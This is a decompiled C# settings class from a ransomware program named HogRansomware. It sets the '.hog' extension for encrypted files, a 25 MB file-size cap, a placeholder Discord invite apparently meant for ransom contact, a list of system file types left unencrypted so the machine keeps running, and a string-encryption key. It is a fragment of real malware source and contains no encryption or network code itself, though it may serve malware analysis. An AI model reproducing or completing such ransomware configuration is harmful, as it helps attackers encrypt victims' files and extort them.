using System;

namespace HogRansomware
{
	// Token: 0x02000003 RID: 3
	internal static class Settings
	{
		// Token: 0x04000002 RID: 2
		internal static string Key;

		// Token: 0x04000003 RID: 3
		internal static string Extension = ".hog";

		// Token: 0x04000004 RID: 4
		internal static long MaxSize = 26214400L;

		// Token: 0x04000005 RID: 5
		internal static string DiscordInvite = "https://discord.gg/INVITE";

		// Token: 0x04000006 RID: 6
		internal static string[] Exclusions = new string[]
		{
			".exe",
			".dll",
			".ini",
			".scr",
			".sys",
			".vmx",
			".vmdk"
		};

		// Token: 0x04000007 RID: 7
		internal static string StringEncryptionKey = "H8CWMvK3RCWgADx8ooqBvg==";
	}
}
